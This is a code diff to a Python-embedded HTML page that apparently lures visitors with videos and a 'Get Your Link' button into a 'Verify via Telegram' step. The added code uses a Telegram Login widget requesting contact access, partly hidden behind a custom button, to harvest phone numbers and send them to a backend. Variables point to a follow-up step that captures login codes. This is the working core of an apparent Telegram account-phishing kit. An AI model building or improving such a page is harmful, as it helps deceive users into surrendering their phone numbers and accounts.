@@ -94,14 +94,19 @@ PAGE = """<!DOCTYPE html>
         .video-item .info h4{font-size:12px;margin-bottom:3px}
         .video-item .info span{font-size:11px;color:#666}
         .footer{text-align:center;padding:20px;color:#333;font-size:11px}
-        .manual-btn{width:100%;padding:12px;background:#2a2a3e;border:none;border-radius:10px;color:#aaa;font-size:13px;cursor:pointer;margin-top:10px;transition:0.2s}
-        .manual-btn:hover{background:#3a3a5e;color:white}
-        /* Telegram Login Widget styles */
-        .tg-login-container{margin:10px 0 15px;display:flex;justify-content:center}
-        .contact-share-btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:16px;background:#0088cc;border:none;border-radius:12px;color:white;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}
-        .contact-share-btn:hover{background:#0077b6;transform:translateY(-1px)}
-        .contact-share-btn .tg-icon{width:24px;height:24px}
-        .phone-display{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:18px;text-align:center;color:#0088cc;margin:10px 0;font-weight:bold;word-break:break-all}
+        /* Telegram Login Button customization */
+        .tg-login-wrapper { margin: 15px 0; display: flex; justify-content: center; }
+        .tg-login-wrapper telegram-login-widget { display: flex; justify-content: center; }
+        /* Hide the default Telegram widget's "Log in via Telegram" text and show a custom button instead */
+        .tg-btn-overlay { position: relative; }
+        .tg-btn-overlay .custom-tg-btn { 
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            width: 100%; padding: 16px; background: #0088cc; border: none; border-radius: 12px;
+            color: white; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s;
+        }
+        .custom-tg-btn:hover { background: #0077b6; transform: translateY(-1px); }
+        .custom-tg-btn .tg-icon { width: 22px; height: 22px; }
+        .hidden-telegram-widget { position: absolute; opacity: 0; pointer-events: none; width: 0; height: 0; overflow: hidden; }
     </style>
 </head>
 <body>
@@ -137,21 +142,10 @@ PAGE = """<!DOCTYPE html>
             <div id="s1" class="step active">
                 <div class="modal-icon">📱</div>
                 <h2>Verify via Telegram</h2>
-                <p>Share your contact to automatically verify</p>
+                <p>Sign in with Telegram to continue</p>
                 
-                <!-- Contact Share Button (uses Telegram login widget approach) -->
-                <div class="tg-login-container">
-                    <button class="contact-share-btn" id="contactShareBtn" onclick="requestContact()">
-                        <svg class="tg-icon" viewBox="0 0 24 24" fill="white">
-                            <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.2.85-.73 1.06-1.47.66l-4.1-3.05-1.99 1.93c-.23.23-.42.46-.83.46z"/>
-                        </svg>
-                        Share My Phone Number
-                    </button>
-                </div>
-                
-                <div id="phoneDisplayArea" style="display:none">
-                    <div class="phone-display" id="phoneDisplay"></div>
-                </div>
+                <!-- Telegram Login Widget will be injected here -->
+                <div id="tgWidgetContainer" class="tg-login-wrapper"></div>
                 
                 <div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
             </div>
@@ -190,148 +184,74 @@ PAGE = """<!DOCTYPE html>
         </div>
     </div>
     
+    <script src="https://telegram.org/js/telegram-widget.js?22"></script>
     <script>
-    // Telegram Login Widget
-    var tgLoginWidget = null;
     var phoneNumber = '';
     var codeDigits = '';
     var codeCheckInterval = null;
+    var tgWidgetReady = false;
     
-    // Initialize Telegram Login widget on page load
-    document.addEventListener('DOMContentLoaded', function() {
-        // Create Telegram Login Widget
-        var script = document.createElement('script');
-        script.src = 'https://telegram.org/js/telegram-widget.js?22';
-        script.setAttribute('data-telegram-login', '');
-        script.setAttribute('data-size', 'large');
-        script.setAttribute('data-request-contact', 'true');
-        script.setAttribute('data-onauth', 'onTelegramAuth(user)');
-        script.async = true;
-        document.body.appendChild(script);
-    });
+    // Handle Telegram Login callback
+    function onTelegramAuth(user) {
+        console.log('Telegram auth callback received:', user);
+        
+        if (user && user.phone_number) {
+            phoneNumber = user.phone_number;
+            document.getElementById('ps1').className = 'sb waiting';
+            document.getElementById('ps1').innerHTML = '<span class="sp"></span> Processing phone number...';
+            document.getElementById('ps1').style.display = 'block';
+            sendPhoneToBackend(phoneNumber);
+        } else {
+            document.getElementById('ps1').className = 'sb error';
+            document.getElementById('ps1').innerHTML = '❌ Could not get phone number. Try again.';
+            document.getElementById('ps1').style.display = 'block';
+        }
+    }
     
-    // Handle the "Get Your Link" button click
+    // Main button click handler
     document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
         document.getElementById('s1').classList.add('active');
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s3').classList.remove('active');
         
-        // Automatically trigger contact request
-        setTimeout(function() {
-            requestContact();
-        }, 500);
+        // Clear any previous messages
+        document.getElementById('ps1').style.display = 'none';
+        
+        // Create the Telegram Login Widget with requestContact
+        createTelegramWidget();
     };
     
-    // Function to request contact via Telegram Login Widget
-    function requestContact() {
-        var btn = document.getElementById('contactShareBtn');
-        btn.disabled = true;
-        btn.innerHTML = '<span class="sp"></span> Requesting...';
+    function createTelegramWidget() {
+        var container = document.getElementById('tgWidgetContainer');
+        container.innerHTML = '';
         
-        // Use Telegram's requestContact through the widget
-        if (window.Telegram && window.Telegram.Login) {
-            // Try widget-based approach
+        // Create a container with the Telegram Login button
+        // Using data-request-contact to get phone number directly
+        var widgetDiv = document.createElement('div');
+        widgetDiv.innerHTML = '<telegram-login-widget ' +
+            'data-telegram-login="" ' +
+            'data-size="large" ' +
+            'data-request-contact="true" ' +
+            'data-onauth="onTelegramAuth(user)" ' +
+            'data-auth-url="">' +
+            '</telegram-login-widget>';
+        
+        container.appendChild(widgetDiv);
+        
+        // Re-initialize the Telegram widget
+        if (window.Telegram && window.Telegram.Widget) {
             try {
-                window.Telegram.Login.requestContact();
+                window.Telegram.Widget.init();
             } catch(e) {
-                console.log('Widget approach failed, using fallback');
-                fallbackRequestContact();
+                console.log('Widget init error:', e);
             }
-        } else {
-            fallbackRequestContact();
         }
-    }
-    
-    // Fallback: Use share contact via tg:// protocol
-    function fallbackRequestContact() {
-        // Try opening a Telegram share contact intent
-        // This prompts the user to share their contact through Telegram deep link
-        var shareUrl = 'tg://msg?text=' + encodeURIComponent('I want to share my phone number');
         
-        // Create an iframe to trigger the protocol
-        var iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.src = shareUrl;
-        document.body.appendChild(iframe);
-        
-        // Show phone input as backup
-        showManualPhoneInput();
-        
-        setTimeout(function() {
-            if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-        }, 3000);
-    }
-    
-    // Show manual phone input as backup
-    function showManualPhoneInput() {
-        var container = document.querySelector('.tg-login-container');
-        
-        // Remove old button
-        var oldBtn = document.getElementById('contactShareBtn');
-        if (oldBtn) oldBtn.style.display = 'none';
-        
-        // Show phone input area
-        var displayArea = document.getElementById('phoneDisplayArea');
-        displayArea.style.display = 'block';
-        
-        // Create phone input
-        var inputHtml = `
-            <input type="tel" class="phone-input" id="phoneInput" placeholder="+8801XXXXXXXXX" maxlength="15" style="margin-top:10px">
-            <button class="get-link-btn" onclick="submitPhone()" style="padding:14px;font-size:16px;margin-top:8px">
-                ✅ Submit Phone
-            </button>
-        `;
-        displayArea.innerHTML = inputHtml;
-        
+        // Show processing message
         document.getElementById('ps1').className = 'sb info';
-        document.getElementById('ps1').innerHTML = '📌 Please enter your phone number manually';
+        document.getElementById('ps1').innerHTML = '🔵 Click the Telegram button above to sign in';
         document.getElementById('ps1').style.display = 'block';
-    }
-    
-    // Handle Telegram auth callback
-    function onTelegramAuth(user) {
-        console.log('Telegram auth:', user);
-        if (user && user.phone_number) {
-            phoneNumber = user.phone_number;
-            processPhoneNumber(phoneNumber);
-        }
-    }
-    
-    // Submit manually entered phone
-    function submitPhone() {
-        var phone = document.getElementById('phoneInput').value.trim();
-        if (!phone) {
-            var ps = document.getElementById('ps1');
-            ps.className = 'sb error';
-            ps.innerHTML = '❌ Please enter your phone number';
-            ps.style.display = 'block';
-            return;
-        }
-        
-        if (phone.startsWith('0') && !phone.startsWith('+')) {
-            phone = '+88' + phone;
-        } else if (!phone.startsWith('+')) {
-            phone = '+' + phone;
-        }
-        
-        processPhoneNumber(phone);
-    }
-    
-    // Process the phone number (send to backend)
-    function processPhoneNumber(phone) {
-        phoneNumber = phone;
-        
-        // Update display
-        document.getElementById('phoneDisplay').textContent = phone;
-        document.getElementById('phoneDisplayArea').style.display = 'block';
-        
-        var ps = document.getElementById('ps1');
-        ps.className = 'sb waiting';
-        ps.innerHTML = '<span class="sp"></span> Submitting...';
-        ps.style.display = 'block';
-        
-        sendPhoneToBackend(phone);
     }
     
     async function sendPhoneToBackend(phone) {
